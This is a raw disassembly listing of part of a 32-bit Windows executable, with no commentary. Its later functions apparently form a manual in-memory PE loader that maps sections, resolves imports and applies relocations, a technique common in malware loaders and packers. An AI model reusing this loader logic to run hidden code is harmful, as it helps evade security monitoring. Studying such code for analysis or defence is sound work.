  403a74:	e8 5d 8c 00 00       	call   0x40c6d6
  403a79:	83 c4 0c             	add    $0xc,%esp
  403a7c:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  403a82:	ff 15 9c d2 40 00    	call   *0x40d29c
  403a88:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  403a8b:	ff 15 9c d2 40 00    	call   *0x40d29c
  403a91:	83 ec 10             	sub    $0x10,%esp
  403a94:	8d 45 18             	lea    0x18(%ebp),%eax
  403a97:	8b cc                	mov    %esp,%ecx
  403a99:	50                   	push   %eax
  403a9a:	ff 15 34 d2 40 00    	call   *0x40d234
  403aa0:	83 ec 10             	sub    $0x10,%esp
  403aa3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403aa6:	8b cc                	mov    %esp,%ecx
  403aa8:	50                   	push   %eax
  403aa9:	ff 15 34 d2 40 00    	call   *0x40d234
  403aaf:	8b cf                	mov    %edi,%ecx
  403ab1:	e8 af fe ff ff       	call   0x403965
  403ab6:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403ab9:	ff 15 9c d2 40 00    	call   *0x40d29c
  403abf:	8d 45 f6             	lea    -0xa(%ebp),%eax
  403ac2:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403ac5:	50                   	push   %eax
  403ac6:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  403acc:	50                   	push   %eax
  403acd:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  403ad3:	56                   	push   %esi
  403ad4:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403ad7:	ff 15 24 d2 40 00    	call   *0x40d224
  403add:	50                   	push   %eax
  403ade:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403ae1:	ff 15 94 d2 40 00    	call   *0x40d294
  403ae7:	50                   	push   %eax
  403ae8:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403aeb:	ff 15 24 d2 40 00    	call   *0x40d224
  403af1:	50                   	push   %eax
  403af2:	e8 ab 02 00 00       	call   0x403da2
  403af7:	83 c4 10             	add    $0x10,%esp
  403afa:	8d 45 18             	lea    0x18(%ebp),%eax
  403afd:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403b00:	6a 00                	push   $0x0
  403b02:	50                   	push   %eax
  403b03:	ff 15 28 d2 40 00    	call   *0x40d228
  403b09:	8b 0d c8 d2 40 00    	mov    0x40d2c8,%ecx
  403b0f:	3b 01                	cmp    (%ecx),%eax
  403b11:	0f 84 88 00 00 00    	je     0x403b9f
  403b17:	8d 45 f7             	lea    -0x9(%ebp),%eax
  403b1a:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403b1d:	50                   	push   %eax
  403b1e:	8d 85 24 fd ff ff    	lea    -0x2dc(%ebp),%eax
  403b24:	68 50 02 00 00       	push   $0x250
  403b29:	50                   	push   %eax
  403b2a:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  403b30:	50                   	push   %eax
  403b31:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403b34:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  403b3a:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403b3d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403b43:	ff 37                	push   (%edi)
  403b45:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  403b48:	83 ec 10             	sub    $0x10,%esp
  403b4b:	8b dc                	mov    %esp,%ebx
  403b4d:	50                   	push   %eax
  403b4e:	8d 45 08             	lea    0x8(%ebp),%eax
  403b51:	68 68 11 41 00       	push   $0x411168
  403b56:	50                   	push   %eax
  403b57:	8d 45 84             	lea    -0x7c(%ebp),%eax
  403b5a:	50                   	push   %eax
  403b5b:	e8 6e 77 00 00       	call   0x40b2ce
  403b60:	59                   	pop    %ecx
  403b61:	59                   	pop    %ecx
  403b62:	50                   	push   %eax
  403b63:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  403b66:	50                   	push   %eax
  403b67:	e8 4c 8b 00 00       	call   0x40c6b8
  403b6c:	83 c4 0c             	add    $0xc,%esp
  403b6f:	50                   	push   %eax
  403b70:	53                   	push   %ebx
  403b71:	e8 42 8b 00 00       	call   0x40c6b8
  403b76:	83 c4 0c             	add    $0xc,%esp
  403b79:	6a 66                	push   $0x66
  403b7b:	e8 21 d9 ff ff       	call   0x4014a1
  403b80:	83 c4 18             	add    $0x18,%esp
  403b83:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b86:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  403b89:	0f 94 c3             	sete   %bl
  403b8c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403b92:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  403b95:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403b9b:	84 db                	test   %bl,%bl
  403b9d:	75 0e                	jne    0x403bad
  403b9f:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403ba2:	ff 15 9c d2 40 00    	call   *0x40d29c
  403ba8:	e9 41 fe ff ff       	jmp    0x4039ee
  403bad:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403bb0:	ff 15 9c d2 40 00    	call   *0x40d29c
  403bb6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403bb9:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403bbf:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403bc2:	ff 15 9c d2 40 00    	call   *0x40d29c
  403bc8:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403bcb:	ff 15 9c d2 40 00    	call   *0x40d29c
  403bd1:	32 c0                	xor    %al,%al
  403bd3:	eb 26                	jmp    0x403bfb
  403bd5:	ff 75 f8             	push   -0x8(%ebp)
  403bd8:	ff 15 38 d1 40 00    	call   *0x40d138
  403bde:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403be1:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  403be7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403bea:	ff 15 9c d2 40 00    	call   *0x40d29c
  403bf0:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403bf3:	ff 15 9c d2 40 00    	call   *0x40d29c
  403bf9:	b0 01                	mov    $0x1,%al
  403bfb:	5f                   	pop    %edi
  403bfc:	5e                   	pop    %esi
  403bfd:	5b                   	pop    %ebx
  403bfe:	c9                   	leave
  403bff:	c2 20 00             	ret    $0x20
  403c02:	b8 68 c7 40 00       	mov    $0x40c768,%eax
  403c07:	e8 34 88 00 00       	call   0x40c440
  403c0c:	51                   	push   %ecx
  403c0d:	51                   	push   %ecx
  403c0e:	53                   	push   %ebx
  403c0f:	56                   	push   %esi
  403c10:	57                   	push   %edi
  403c11:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403c14:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403c18:	33 ff                	xor    %edi,%edi
  403c1a:	89 7d ec             	mov    %edi,-0x14(%ebp)
  403c1d:	be 30 17 41 00       	mov    $0x411730,%esi
  403c22:	8b ce                	mov    %esi,%ecx
  403c24:	e8 bc 00 00 00       	call   0x403ce5
  403c29:	3b f8                	cmp    %eax,%edi
  403c2b:	73 55                	jae    0x403c82
  403c2d:	57                   	push   %edi
  403c2e:	8b ce                	mov    %esi,%ecx
  403c30:	e8 c6 00 00 00       	call   0x403cfb
  403c35:	8b 00                	mov    (%eax),%eax
  403c37:	3b 45 08             	cmp    0x8(%ebp),%eax
  403c3a:	75 3a                	jne    0x403c76
  403c3c:	57                   	push   %edi
  403c3d:	8b ce                	mov    %esi,%ecx
  403c3f:	e8 b7 00 00 00       	call   0x403cfb
  403c44:	8b 40 08             	mov    0x8(%eax),%eax
  403c47:	ff 30                	push   (%eax)
  403c49:	e8 ac 8a 00 00       	call   0x40c6fa
  403c4e:	6a 00                	push   $0x0
  403c50:	57                   	push   %edi
  403c51:	8b ce                	mov    %esi,%ecx
  403c53:	e8 a3 00 00 00       	call   0x403cfb
  403c58:	ff 70 04             	push   0x4(%eax)
  403c5b:	ff 15 34 d1 40 00    	call   *0x40d134
  403c61:	8b ce                	mov    %esi,%ecx
  403c63:	e8 23 df ff ff       	call   0x401b8b
  403c68:	8d 0c 7f             	lea    (%edi,%edi,2),%ecx
  403c6b:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403c6e:	50                   	push   %eax
  403c6f:	8b ce                	mov    %esi,%ecx
  403c71:	e8 b2 00 00 00       	call   0x403d28
  403c76:	47                   	inc    %edi
  403c77:	89 7d ec             	mov    %edi,-0x14(%ebp)
  403c7a:	eb a6                	jmp    0x403c22
  403c7c:	b8 82 3c 40 00       	mov    $0x403c82,%eax
  403c81:	c3                   	ret
  403c82:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  403c86:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403c89:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403c90:	5f                   	pop    %edi
  403c91:	5e                   	pop    %esi
  403c92:	5b                   	pop    %ebx
  403c93:	c9                   	leave
  403c94:	c3                   	ret
  403c95:	c3                   	ret
  403c96:	55                   	push   %ebp
  403c97:	8b ec                	mov    %esp,%ebp
  403c99:	8b c1                	mov    %ecx,%eax
  403c9b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c9e:	8a 09                	mov    (%ecx),%cl
  403ca0:	88 08                	mov    %cl,(%eax)
  403ca2:	33 c9                	xor    %ecx,%ecx
  403ca4:	89 48 04             	mov    %ecx,0x4(%eax)
  403ca7:	89 48 08             	mov    %ecx,0x8(%eax)
  403caa:	89 48 0c             	mov    %ecx,0xc(%eax)
  403cad:	5d                   	pop    %ebp
  403cae:	c2 04 00             	ret    $0x4
  403cb1:	56                   	push   %esi
  403cb2:	8b f1                	mov    %ecx,%esi
  403cb4:	57                   	push   %edi
  403cb5:	ff 76 08             	push   0x8(%esi)
  403cb8:	ff 76 04             	push   0x4(%esi)
  403cbb:	e8 a0 00 00 00       	call   0x403d60
  403cc0:	8b 4e 04             	mov    0x4(%esi),%ecx
  403cc3:	8b 46 0c             	mov    0xc(%esi),%eax
  403cc6:	2b c1                	sub    %ecx,%eax
  403cc8:	6a 0c                	push   $0xc
  403cca:	99                   	cltd
  403ccb:	5f                   	pop    %edi
  403ccc:	f7 ff                	idiv   %edi
  403cce:	50                   	push   %eax
  403ccf:	51                   	push   %ecx
  403cd0:	8b ce                	mov    %esi,%ecx
  403cd2:	e8 ab 00 00 00       	call   0x403d82
  403cd7:	33 c0                	xor    %eax,%eax
  403cd9:	5f                   	pop    %edi
  403cda:	89 46 04             	mov    %eax,0x4(%esi)
  403cdd:	89 46 08             	mov    %eax,0x8(%esi)
  403ce0:	89 46 0c             	mov    %eax,0xc(%esi)
  403ce3:	5e                   	pop    %esi
  403ce4:	c3                   	ret
  403ce5:	8b 51 04             	mov    0x4(%ecx),%edx
  403ce8:	85 d2                	test   %edx,%edx
  403cea:	75 03                	jne    0x403cef
  403cec:	33 c0                	xor    %eax,%eax
  403cee:	c3                   	ret
  403cef:	8b 41 08             	mov    0x8(%ecx),%eax
  403cf2:	6a 0c                	push   $0xc
  403cf4:	2b c2                	sub    %edx,%eax
  403cf6:	59                   	pop    %ecx
  403cf7:	99                   	cltd
  403cf8:	f7 f9                	idiv   %ecx
  403cfa:	c3                   	ret
  403cfb:	55                   	push   %ebp
  403cfc:	8b ec                	mov    %esp,%ebp
  403cfe:	56                   	push   %esi
  403cff:	57                   	push   %edi
  403d00:	8b f9                	mov    %ecx,%edi
  403d02:	e8 de ff ff ff       	call   0x403ce5
  403d07:	8b 75 08             	mov    0x8(%ebp),%esi
  403d0a:	3b c6                	cmp    %esi,%eax
  403d0c:	77 07                	ja     0x403d15
  403d0e:	8b cf                	mov    %edi,%ecx
  403d10:	e8 af de ff ff       	call   0x401bc4
  403d15:	8b cf                	mov    %edi,%ecx
  403d17:	e8 6f de ff ff       	call   0x401b8b
  403d1c:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  403d1f:	5f                   	pop    %edi
  403d20:	5e                   	pop    %esi
  403d21:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403d24:	5d                   	pop    %ebp
  403d25:	c2 04 00             	ret    $0x4
  403d28:	55                   	push   %ebp
  403d29:	8b ec                	mov    %esp,%ebp
  403d2b:	56                   	push   %esi
  403d2c:	57                   	push   %edi
  403d2d:	8b 7d 08             	mov    0x8(%ebp),%edi
  403d30:	8b f1                	mov    %ecx,%esi
  403d32:	57                   	push   %edi
  403d33:	e8 62 80 00 00       	call   0x40bd9a
  403d38:	50                   	push   %eax
  403d39:	8d 47 0c             	lea    0xc(%edi),%eax
  403d3c:	50                   	push   %eax
  403d3d:	e8 88 00 00 00       	call   0x403dca
  403d42:	8b 46 08             	mov    0x8(%esi),%eax
  403d45:	83 c4 0c             	add    $0xc,%esp
  403d48:	8b ce                	mov    %esi,%ecx
  403d4a:	50                   	push   %eax
  403d4b:	83 c0 f4             	add    $0xfffffff4,%eax
  403d4e:	50                   	push   %eax
  403d4f:	e8 0c 00 00 00       	call   0x403d60
  403d54:	83 46 08 f4          	addl   $0xfffffff4,0x8(%esi)
  403d58:	8b c7                	mov    %edi,%eax
  403d5a:	5f                   	pop    %edi
  403d5b:	5e                   	pop    %esi
  403d5c:	5d                   	pop    %ebp
  403d5d:	c2 04 00             	ret    $0x4
  403d60:	55                   	push   %ebp
  403d61:	8b ec                	mov    %esp,%ebp
  403d63:	56                   	push   %esi
  403d64:	8b 75 08             	mov    0x8(%ebp),%esi
  403d67:	57                   	push   %edi
  403d68:	8b f9                	mov    %ecx,%edi
  403d6a:	3b 75 0c             	cmp    0xc(%ebp),%esi
  403d6d:	74 0d                	je     0x403d7c
  403d6f:	56                   	push   %esi
  403d70:	8b cf                	mov    %edi,%ecx
  403d72:	e8 1b 00 00 00       	call   0x403d92
  403d77:	83 c6 0c             	add    $0xc,%esi
  403d7a:	eb ee                	jmp    0x403d6a
  403d7c:	5f                   	pop    %edi
  403d7d:	5e                   	pop    %esi
  403d7e:	5d                   	pop    %ebp
  403d7f:	c2 08 00             	ret    $0x8
  403d82:	55                   	push   %ebp
  403d83:	8b ec                	mov    %esp,%ebp
  403d85:	ff 75 08             	push   0x8(%ebp)
  403d88:	e8 65 86 00 00       	call   0x40c3f2
  403d8d:	59                   	pop    %ecx
  403d8e:	5d                   	pop    %ebp
  403d8f:	c2 08 00             	ret    $0x8
  403d92:	55                   	push   %ebp
  403d93:	8b ec                	mov    %esp,%ebp
  403d95:	ff 75 08             	push   0x8(%ebp)
  403d98:	e8 55 00 00 00       	call   0x403df2
  403d9d:	59                   	pop    %ecx
  403d9e:	5d                   	pop    %ebp
  403d9f:	c2 04 00             	ret    $0x4
  403da2:	55                   	push   %ebp
  403da3:	8b ec                	mov    %esp,%ebp
  403da5:	56                   	push   %esi
  403da6:	8b 75 08             	mov    0x8(%ebp),%esi
  403da9:	3b 75 0c             	cmp    0xc(%ebp),%esi
  403dac:	74 16                	je     0x403dc4
  403dae:	0f b7 06             	movzwl (%esi),%eax
  403db1:	50                   	push   %eax
  403db2:	ff 55 14             	call   *0x14(%ebp)
  403db5:	59                   	pop    %ecx
  403db6:	46                   	inc    %esi
  403db7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403dba:	46                   	inc    %esi
  403dbb:	83 45 10 02          	addl   $0x2,0x10(%ebp)
  403dbf:	66 89 01             	mov    %ax,(%ecx)
  403dc2:	eb e5                	jmp    0x403da9
  403dc4:	8b 45 10             	mov    0x10(%ebp),%eax
  403dc7:	5e                   	pop    %esi
  403dc8:	5d                   	pop    %ebp
  403dc9:	c3                   	ret
  403dca:	55                   	push   %ebp
  403dcb:	8b ec                	mov    %esp,%ebp
  403dcd:	8b 45 08             	mov    0x8(%ebp),%eax
  403dd0:	3b 45 0c             	cmp    0xc(%ebp),%eax
  403dd3:	74 18                	je     0x403ded
  403dd5:	56                   	push   %esi
  403dd6:	57                   	push   %edi
  403dd7:	8b 7d 10             	mov    0x10(%ebp),%edi
  403dda:	8b f0                	mov    %eax,%esi
  403ddc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403ddd:	83 45 10 0c          	addl   $0xc,0x10(%ebp)
  403de1:	83 c0 0c             	add    $0xc,%eax
  403de4:	3b 45 0c             	cmp    0xc(%ebp),%eax
  403de7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403de8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403de9:	75 ec                	jne    0x403dd7
  403deb:	5f                   	pop    %edi
  403dec:	5e                   	pop    %esi
  403ded:	8b 45 10             	mov    0x10(%ebp),%eax
  403df0:	5d                   	pop    %ebp
  403df1:	c3                   	ret
  403df2:	c3                   	ret
  403df3:	55                   	push   %ebp
  403df4:	8b ec                	mov    %esp,%ebp
  403df6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403dfa:	57                   	push   %edi
  403dfb:	74 4f                	je     0x403e4c
  403dfd:	8b 3d 40 17 41 00    	mov    0x411740,%edi
  403e03:	85 ff                	test   %edi,%edi
  403e05:	74 45                	je     0x403e4c
  403e07:	56                   	push   %esi
  403e08:	8b 75 08             	mov    0x8(%ebp),%esi
  403e0b:	8d 47 04             	lea    0x4(%edi),%eax
  403e0e:	8a 10                	mov    (%eax),%dl
  403e10:	8a ca                	mov    %dl,%cl
  403e12:	3a 16                	cmp    (%esi),%dl
  403e14:	75 1a                	jne    0x403e30
  403e16:	84 c9                	test   %cl,%cl
  403e18:	74 12                	je     0x403e2c
  403e1a:	8a 50 01             	mov    0x1(%eax),%dl
  403e1d:	8a ca                	mov    %dl,%cl
  403e1f:	3a 56 01             	cmp    0x1(%esi),%dl
  403e22:	75 0c                	jne    0x403e30
  403e24:	40                   	inc    %eax
  403e25:	40                   	inc    %eax
  403e26:	46                   	inc    %esi
  403e27:	46                   	inc    %esi
  403e28:	84 c9                	test   %cl,%cl
  403e2a:	75 e2                	jne    0x403e0e
  403e2c:	33 c0                	xor    %eax,%eax
  403e2e:	eb 05                	jmp    0x403e35
  403e30:	1b c0                	sbb    %eax,%eax
  403e32:	83 d8 ff             	sbb    $0xffffffff,%eax
  403e35:	85 c0                	test   %eax,%eax
  403e37:	74 0a                	je     0x403e43
  403e39:	8b bf 0c 01 00 00    	mov    0x10c(%edi),%edi
  403e3f:	85 ff                	test   %edi,%edi
  403e41:	75 c5                	jne    0x403e08
  403e43:	85 ff                	test   %edi,%edi
  403e45:	5e                   	pop    %esi
  403e46:	74 04                	je     0x403e4c
  403e48:	8b 07                	mov    (%edi),%eax
  403e4a:	eb 02                	jmp    0x403e4e
  403e4c:	33 c0                	xor    %eax,%eax
  403e4e:	5f                   	pop    %edi
  403e4f:	5d                   	pop    %ebp
  403e50:	c3                   	ret
  403e51:	55                   	push   %ebp
  403e52:	8b ec                	mov    %esp,%ebp
  403e54:	53                   	push   %ebx
  403e55:	56                   	push   %esi
  403e56:	8b 75 08             	mov    0x8(%ebp),%esi
  403e59:	57                   	push   %edi
  403e5a:	33 ff                	xor    %edi,%edi
  403e5c:	8b 46 3c             	mov    0x3c(%esi),%eax
  403e5f:	57                   	push   %edi
  403e60:	8d 44 30 18          	lea    0x18(%eax,%esi,1),%eax
  403e64:	8b 40 38             	mov    0x38(%eax),%eax
  403e67:	05 00 10 00 00       	add    $0x1000,%eax
  403e6c:	50                   	push   %eax
  403e6d:	57                   	push   %edi
  403e6e:	6a 04                	push   $0x4
  403e70:	57                   	push   %edi
  403e71:	6a ff                	push   $0xffffffff
  403e73:	ff 15 2c d1 40 00    	call   *0x40d12c
  403e79:	57                   	push   %edi
  403e7a:	57                   	push   %edi
  403e7b:	57                   	push   %edi
  403e7c:	8b d8                	mov    %eax,%ebx
  403e7e:	57                   	push   %edi
  403e7f:	6a 02                	push   $0x2
  403e81:	53                   	push   %ebx
  403e82:	ff 15 30 d1 40 00    	call   *0x40d130
  403e88:	53                   	push   %ebx
  403e89:	8b f8                	mov    %eax,%edi
  403e8b:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  403e91:	57                   	push   %edi
  403e92:	56                   	push   %esi
  403e93:	e8 74 01 00 00       	call   0x40400c
  403e98:	57                   	push   %edi
  403e99:	e8 12 00 00 00       	call   0x403eb0
  403e9e:	6a 01                	push   $0x1
  403ea0:	57                   	push   %edi
  403ea1:	e8 e0 01 00 00       	call   0x404086
  403ea6:	83 c4 14             	add    $0x14,%esp
  403ea9:	8b c7                	mov    %edi,%eax
  403eab:	5f                   	pop    %edi
  403eac:	5e                   	pop    %esi
  403ead:	5b                   	pop    %ebx
  403eae:	5d                   	pop    %ebp
  403eaf:	c3                   	ret
  403eb0:	55                   	push   %ebp
  403eb1:	8b ec                	mov    %esp,%ebp
  403eb3:	51                   	push   %ecx
  403eb4:	51                   	push   %ecx
  403eb5:	8b 45 08             	mov    0x8(%ebp),%eax
  403eb8:	53                   	push   %ebx
  403eb9:	56                   	push   %esi
  403eba:	57                   	push   %edi
  403ebb:	8b 48 3c             	mov    0x3c(%eax),%ecx
  403ebe:	83 7c 01 74 10       	cmpl   $0x10,0x74(%ecx,%eax,1)
  403ec3:	8d 5c 01 18          	lea    0x18(%ecx,%eax,1),%ebx
  403ec7:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403eca:	0f 82 30 01 00 00    	jb     0x404000
  403ed0:	83 7b 6c 00          	cmpl   $0x0,0x6c(%ebx)
  403ed4:	0f 84 99 00 00 00    	je     0x403f73
  403eda:	8b 73 68             	mov    0x68(%ebx),%esi
  403edd:	03 f0                	add    %eax,%esi
  403edf:	83 3e 00             	cmpl   $0x0,(%esi)
  403ee2:	0f 84 8b 00 00 00    	je     0x403f73
  403ee8:	8b 7e 0c             	mov    0xc(%esi),%edi
  403eeb:	03 f8                	add    %eax,%edi
  403eed:	57                   	push   %edi
  403eee:	e8 00 ff ff ff       	call   0x403df3
  403ef3:	85 c0                	test   %eax,%eax
  403ef5:	59                   	pop    %ecx
  403ef6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ef9:	75 12                	jne    0x403f0d
  403efb:	57                   	push   %edi
  403efc:	ff 15 24 d1 40 00    	call   *0x40d124
  403f02:	85 c0                	test   %eax,%eax
  403f04:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f07:	0f 84 f3 00 00 00    	je     0x404000
  403f0d:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  403f11:	75 51                	jne    0x403f64
  403f13:	8b 3e                	mov    (%esi),%edi
  403f15:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f18:	8b 5e 10             	mov    0x10(%esi),%ebx
  403f1b:	03 7d 08             	add    0x8(%ebp),%edi
  403f1e:	03 5d 08             	add    0x8(%ebp),%ebx
  403f21:	89 46 08             	mov    %eax,0x8(%esi)
  403f24:	c7 46 04 00 bc 3a 12 	movl   $0x123abc00,0x4(%esi)
  403f2b:	8b 07                	mov    (%edi),%eax
  403f2d:	85 c0                	test   %eax,%eax
  403f2f:	74 30                	je     0x403f61
  403f31:	a9 00 00 00 80       	test   $0x80000000,%eax
  403f36:	74 05                	je     0x403f3d
  403f38:	0f b7 c0             	movzwl %ax,%eax
  403f3b:	eb 08                	jmp    0x403f45
  403f3d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f40:	03 c1                	add    %ecx,%eax
  403f42:	83 c0 02             	add    $0x2,%eax
  403f45:	50                   	push   %eax
  403f46:	ff 75 fc             	push   -0x4(%ebp)
  403f49:	ff 15 28 d1 40 00    	call   *0x40d128
  403f4f:	85 c0                	test   %eax,%eax
  403f51:	0f 84 a9 00 00 00    	je     0x404000
  403f57:	89 03                	mov    %eax,(%ebx)
  403f59:	83 c7 04             	add    $0x4,%edi
  403f5c:	83 c3 04             	add    $0x4,%ebx
  403f5f:	eb ca                	jmp    0x403f2b
  403f61:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  403f64:	8b 45 08             	mov    0x8(%ebp),%eax
  403f67:	83 c6 14             	add    $0x14,%esi
  403f6a:	83 3e 00             	cmpl   $0x0,(%esi)
  403f6d:	0f 85 75 ff ff ff    	jne    0x403ee8
  403f73:	8b f8                	mov    %eax,%edi
  403f75:	2b 7b 1c             	sub    0x1c(%ebx),%edi
  403f78:	0f 84 86 00 00 00    	je     0x404004
  403f7e:	83 bb 8c 00 00 00 00 	cmpl   $0x0,0x8c(%ebx)
  403f85:	74 7d                	je     0x404004
  403f87:	8b 8b 88 00 00 00    	mov    0x88(%ebx),%ecx
  403f8d:	03 c8                	add    %eax,%ecx
  403f8f:	83 39 00             	cmpl   $0x0,(%ecx)
  403f92:	74 70                	je     0x404004
  403f94:	8b 59 04             	mov    0x4(%ecx),%ebx
  403f97:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403f9b:	83 eb 08             	sub    $0x8,%ebx
  403f9e:	8d 71 08             	lea    0x8(%ecx),%esi
  403fa1:	d1 eb                	shr    $1,%ebx
  403fa3:	85 db                	test   %ebx,%ebx
  403fa5:	7e 54                	jle    0x403ffb
  403fa7:	0f b7 16             	movzwl (%esi),%edx
  403faa:	8b c2                	mov    %edx,%eax
  403fac:	25 ff 0f 00 00       	and    $0xfff,%eax
  403fb1:	03 01                	add    (%ecx),%eax
  403fb3:	c1 ea 0c             	shr    $0xc,%edx
  403fb6:	03 45 08             	add    0x8(%ebp),%eax
  403fb9:	83 ea 00             	sub    $0x0,%edx
  403fbc:	74 33                	je     0x403ff1
  403fbe:	4a                   	dec    %edx
  403fbf:	74 28                	je     0x403fe9
  403fc1:	4a                   	dec    %edx
  403fc2:	74 20                	je     0x403fe4
  403fc4:	4a                   	dec    %edx
  403fc5:	74 19                	je     0x403fe0
  403fc7:	4a                   	dec    %edx
  403fc8:	75 36                	jne    0x404000
  403fca:	0f b7 56 02          	movzwl 0x2(%esi),%edx
  403fce:	83 c6 02             	add    $0x2,%esi
  403fd1:	8d 94 3a 00 80 00 00 	lea    0x8000(%edx,%edi,1),%edx
  403fd8:	c1 ea 10             	shr    $0x10,%edx
  403fdb:	66 09 10             	or     %dx,(%eax)
  403fde:	eb 11                	jmp    0x403ff1
  403fe0:	01 38                	add    %edi,(%eax)
  403fe2:	eb 0d                	jmp    0x403ff1
  403fe4:	66 01 38             	add    %di,(%eax)
  403fe7:	eb 08                	jmp    0x403ff1
  403fe9:	8b d7                	mov    %edi,%edx
  403feb:	c1 ea 10             	shr    $0x10,%edx
  403fee:	66 01 10             	add    %dx,(%eax)
  403ff1:	46                   	inc    %esi
  403ff2:	46                   	inc    %esi
  403ff3:	ff 45 fc             	incl   -0x4(%ebp)
  403ff6:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  403ff9:	7c ac                	jl     0x403fa7
  403ffb:	03 49 04             	add    0x4(%ecx),%ecx
  403ffe:	eb 8f                	jmp    0x403f8f
  404000:	33 c0                	xor    %eax,%eax
  404002:	eb 03                	jmp    0x404007
  404004:	6a 01                	push   $0x1
  404006:	58                   	pop    %eax
  404007:	5f                   	pop    %edi
  404008:	5e                   	pop    %esi
  404009:	5b                   	pop    %ebx
  40400a:	c9                   	leave
  40400b:	c3                   	ret
  40400c:	55                   	push   %ebp
  40400d:	8b ec                	mov    %esp,%ebp
  40400f:	51                   	push   %ecx
  404010:	8b 45 08             	mov    0x8(%ebp),%eax
  404013:	53                   	push   %ebx
  404014:	56                   	push   %esi
  404015:	57                   	push   %edi
  404016:	8b 48 3c             	mov    0x3c(%eax),%ecx
  404019:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40401c:	8b f0                	mov    %eax,%esi
  40401e:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  404022:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  404025:	8b 4c 08 54          	mov    0x54(%eax,%ecx,1),%ecx
  404029:	8b d9                	mov    %ecx,%ebx
  40402b:	c1 e9 02             	shr    $0x2,%ecx
  40402e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404030:	8b cb                	mov    %ebx,%ecx
  404032:	83 e1 03             	and    $0x3,%ecx
  404035:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404037:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40403a:	66 83 7a 06 00       	cmpw   $0x0,0x6(%edx)
  40403f:	8d 8c 08 f8 00 00 00 	lea    0xf8(%eax,%ecx,1),%ecx
  404046:	76 36                	jbe    0x40407e
  404048:	8d 79 14             	lea    0x14(%ecx),%edi
  40404b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40404e:	8b 4f fc             	mov    -0x4(%edi),%ecx
  404051:	8b f0                	mov    %eax,%esi
  404053:	03 37                	add    (%edi),%esi
  404055:	8b 7f f8             	mov    -0x8(%edi),%edi
  404058:	03 7d 0c             	add    0xc(%ebp),%edi
  40405b:	8b d9                	mov    %ecx,%ebx
  40405d:	c1 e9 02             	shr    $0x2,%ecx
  404060:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404062:	8b cb                	mov    %ebx,%ecx
  404064:	83 e1 03             	and    $0x3,%ecx
  404067:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404069:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40406c:	0f b7 4a 06          	movzwl 0x6(%edx),%ecx
  404070:	83 c7 28             	add    $0x28,%edi
  404073:	ff 45 08             	incl   0x8(%ebp)
  404076:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  404079:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40407c:	7c d0                	jl     0x40404e
  40407e:	6a 01                	push   $0x1
  404080:	58                   	pop    %eax
  404081:	5f                   	pop    %edi
  404082:	5e                   	pop    %esi
  404083:	5b                   	pop    %ebx
  404084:	c9                   	leave
